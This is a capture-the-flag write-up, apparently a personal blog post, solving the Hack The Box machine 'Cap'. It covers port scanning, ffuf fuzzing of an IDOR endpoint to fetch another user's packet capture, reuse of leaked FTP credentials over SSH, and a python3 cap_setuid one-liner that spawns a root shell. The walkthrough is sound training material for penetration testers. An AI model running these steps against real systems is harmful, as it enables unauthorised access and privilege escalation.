---
layout: layouts/post.njk
date: 2026-03-19
title: "Cap"
category: Boot2Root
tags: [HTB]
description: "IDOR to FTP creds, then Linux capabilities privesc to root."
---

## Recon

Full TCP scan found `21`, `22` and `80` open:

```bash
nmap -sC -sV -oN portscan -v 10.129.13.106
```

Service summary:

```text
21/tcp open ftp     vsftpd 3.0.3
22/tcp open ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
80/tcp open http    Gunicorn
```

## Web discovery

The site is a `Security Dashboard`, logged in as Nathan by default. The sidebar links to three endpoints:

- `/ip` — `ifconfig` output
- `/netstat` — `netstat -aneop` output
- `/capture` — runs a 5-second tcpdump, then redirects to `/data/<id>`

Clicking capture redirected me to `/data/1`. The numeric ID in the URL suggested IDOR, so I fuzzed it:

```bash
ffuf -u "http://10.129.13.106/data/FUZZ" -w <(seq 0 1000) -mc 200
```

Three IDs returned `200`: `0`, `1`, and `2`. The rest redirected. `/data/0` was larger than the others, suggesting it contained different data — someone else's capture.

## Foothold

Downloaded the pcap from `/data/0`:
Ran `strings` on it and found plaintext FTP credentials:

```text
220 (vsFTPd 3.0.3)
USER nathan
331 Please specify the password.
PASS Buck3tH4TF0RM3!
230 Login successful.
```

SSH with the leaked creds:

```bash
ssh nathan@10.129.13.106
# password: Buck3tH4TF0RM3!
```

User flag in `/home/nathan/user.txt`.

## Privilege escalation

The challenge name is `Cap`, hinting at Linux capabilities. Checked for binaries with interesting capabilities:

```bash
getcap /usr/bin/python3* 2>/dev/null
```

```text
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

Before SSH, I used FTP to browse the filesystem and read `/var/www/html/app.py`. The `/capture` route stood out — it spawns a subprocess that calls `os.setuid(0)` before running tcpdump, meaning python3 must have `cap_setuid`. That same capability gives us root:

Instant root:

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

```text
root@cap:~# whoami
root
root@cap:~# id
uid=0(root) gid=1001(nathan) groups=1001(nathan)
```

## Flag

```bash
cat /root/root.txt
```

## Summary

1. Scanned TCP ports and identified FTP, SSH and HTTP.
2. Found IDOR on `/data/<id>` endpoint exposing other users' packet captures.
3. Downloaded pcap from `/data/0` containing plaintext FTP credentials for `nathan`.
4. Logged in via SSH and grabbed the user flag.
5. Found `cap_setuid` capability on `python3.8` and used `os.setuid(0)` to escalate to root.
